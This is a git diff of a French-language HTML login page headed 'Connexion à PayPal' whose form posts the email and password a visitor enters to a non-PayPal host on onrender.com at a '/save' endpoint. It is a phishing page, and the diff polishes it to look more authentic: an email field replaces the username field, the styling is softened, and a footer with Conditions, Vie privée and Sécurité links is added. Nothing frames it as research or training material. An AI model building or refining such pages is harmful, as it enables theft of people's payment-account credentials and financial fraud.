@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr, en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -18,8 +18,12 @@
     .login-container {
       background-color: #fff;
       padding: 40px 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      border-radius: 8px;
+
+      /* Carré beaucoup moins visible */
+      box-shadow: 0 1px 5px rgba(0,0,0,0.1);
+      border: 1px solid #e5e5e5;
+
       width: 350px;
       text-align: center;
     }
@@ -32,6 +36,7 @@
     h2 {
       margin-bottom: 25px;
       color: #333;
+      font-weight: 500;
     }
 
     input {
@@ -39,7 +44,7 @@
       padding: 12px;
       margin: 10px 0;
       border-radius: 5px;
-      border: 1px solid #ccc;
+      border: 1px solid #bbb;
       box-sizing: border-box;
       font-size: 14px;
     }
@@ -76,6 +81,23 @@
       text-decoration: underline;
     }
 
+    /* Section bas de page */
+    .footer-info {
+      font-size: 11px;
+      color: #666;
+      margin-top: 20px;
+    }
+
+    .footer-info a {
+      color: #666;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .footer-info a:hover {
+      text-decoration: underline;
+    }
+
     @media (max-width: 400px) {
       .login-container {
         width: 90%;
@@ -91,7 +113,7 @@
     <h2>Connexion à PayPal</h2>
 
     <form action="https://mon-projet-2-oq6y.onrender.com/save" method="POST">
-      <input type="text" name="username" placeholder="Nom d'utilisateur" required>
+      <input type="email" name="email" placeholder="Email" required>
       <input type="password" name="password" placeholder="Mot de passe" required>
       <button type="submit">Connexion</button>
     </form>
@@ -99,6 +121,12 @@
     <div class="links">
       <a href="#">Mot de passe oublié ?</a> |
       <a href="#">Besoin d'aide ?</a>
+    </div>
+
+    <div class="footer-info">
+      <a href="#">Conditions</a> • 
+      <a href="#">Vie privée</a> • 
+      <a href="#">Sécurité</a>
     </div>
   </div>
 
